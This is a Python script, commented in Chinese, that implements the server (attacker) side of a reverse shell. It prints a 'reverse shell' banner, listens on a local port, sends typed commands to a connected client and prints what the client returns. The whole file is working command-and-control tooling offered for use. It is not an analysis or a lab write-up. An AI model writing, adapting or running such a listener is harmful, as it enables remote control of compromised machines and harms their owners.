import socket
import time
import os

#反弹shell服务端

def start_server():
    while True:
        print("| '__/ _ \\ \\ / / _ \\ '__/ __|/ _ \\")
        print("| | |  __/\\ V /  __/ |  \\__ \\  __/")
        print("|_|  \\___| \\_/ \\___|_|  |___/\\___|")
        print(" ___| |__   ___| | |")
        print("/ __| '_ \\ / _ \\ | |")
        print("\\__ \\ | | |  __/ | |")
        print("|___/_| |_|\\___|_|_|")
        print("************* Server等待连接,1000秒后超时,exit退出 *************")
        
        conn,addr = s.accept()
        while True:
            try:
                user_input = input('>>> ').strip()
                if user_input!="": #输入不为空

                    if user_input=="exit":
                        os._exit(0)
                    else:
                        try:
                            conn.send(user_input.encode('utf-8')) #编码发送
                        except:
                            print("服务器发送异常")
                        try:
                            cmd=conn.recv(4096).decode() #解码接受
                        except:
                            print("服务器接收异常")
                        print(cmd) #输出命令
       
                elif user_input=="":
                    print("命令不能空")
                
            except:
                print("服务器异常")
                
    s.close()

if __name__ == '__main__':
    HostPort = ('127.0.0.1',8888)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(HostPort)
    s.listen(5)
    s.settimeout(1000) #设置超时时间1000秒
    start_server()
